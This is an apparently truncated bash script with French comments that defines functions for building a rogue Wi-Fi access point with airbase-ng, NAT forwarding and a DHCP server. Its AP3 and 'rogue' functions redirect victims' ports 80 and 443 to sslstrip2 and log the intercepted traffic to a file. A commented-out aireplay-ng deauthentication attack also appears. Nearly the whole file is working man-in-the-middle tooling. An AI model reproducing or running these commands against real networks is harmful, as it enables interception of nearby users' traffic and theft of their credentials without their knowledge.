
	#creation d'un Access Point
	echo -e "/!\ KALI MUST BE SET IN AIPLANE MODE/WIFI DISABLED BEFORE.\nthe nat configuration of iptables is not flush for do that: iptables -t nat -D PREROUTING 1 "
	echo -e "syntax: AP1 <bssid/mac> <essid/APname> <canal> <iface>"
	ifconfig $4 down
	iwconfig $4 mode monitor
	rfkill unblock wlan
	airbase-ng -a $1 -c $3 --essid $2 $4 
}
export -f AP1

function AP2 {

	#creation d'un access point + acces internet
	echo -e "syntax: AP2 <bssid/mac> <essid/APname> <canal> <Wifi-Iface> <redirection-iface>"
	#creation de l'ap en arriere plan:
	AP1 $1 $2 $3 $4 &
	echo "please wait 10..."
	sleep 10
	#flush d'iptable et redirection de port:
	iptables -F && iptables -X
	iptables -P FORWARD ACCEPT
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -t nat -A POSTROUTING -o $5 -j MASQUERADE
	#kernel fowarding
	echo 1 > /proc/sys/net/ipv4/ip_forward
	
	#configuration du rogue AP: puissance, ip, routage DHCP
	iwconfig wlan0 txpower 30
	ifconfig at0 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	
	echo -e "default-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.10 10.0.0.15;\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\noption domain-name \"local\";\n}" > /etc/dhcp/dhcpd.conf

	echo -e "INTERFACESv4=\"at0\"\nINTERFACESv6=\"\"" > /etc/default/isc-dhcp-server 
	service isc-dhcp-server restart
	echo "Enjoy!"
}
export -f AP2

function AP3 {

        #creation d'un access point + acces internet + proxy
        echo -e "syntax: AP3 <bssid/mac> <essid/APname> <canal> <Wifi-Iface> <redirection-iface>"
        #creation de l'ap en arriere plan:
        AP1 $1 $2 $3 $4 &
	echo "lease wait 10..."
        sleep 10
        #flush d'iptable et redirection de port:
        iptables -F && iptables -X
        iptables -P FORWARD ACCEPT
        iptables -P INPUT ACCEPT
        iptables -P OUTPUT ACCEPT
        iptables -t nat -A POSTROUTING -o $5 -j MASQUERADE
        #kernel fowarding
        echo 1 > /proc/sys/net/ipv4/ip_forward

        #configuration du rogue AP: puissance, ip, routage DHCP
        iwconfig wlan0 txpower 30
        ifconfig at0 10.0.0.1 netmask 255.255.255.0
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

        echo -e "default-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.10 10.0.0.15;\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\noption domain-name \"local\";\n}" > /etc/dhcp/dhcpd.conf

        echo -e "INTERFACESv4=\"at0\"\nINTERFACESv6=\"\"" > /etc/default/isc-dhcp-server
        service isc-dhcp-server restart
	
	#mise en place du prooxy:
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
        #Attaque par desauthentification:
        #aireplay-ng -0 15 -a $1 $4
        #sslstrip standard:
        #sslstrip -l 10000 -w ./sslstrip_log    
        #sslstrip2/Leonardo
        /root/Documents/Projets/RogueAP/sslstrip2-master/sslstrip.py -l 10000 -w ./leonardo.log
# }
export -f AP3

function ap { AP2 00:01:C7:4E:15:0D $1 6 $2 $3 ; }
export -f ap
function rogue { AP3 00:01:C7:4E:15:0D $1 6 $2 $3 ; } 
export -f rogue

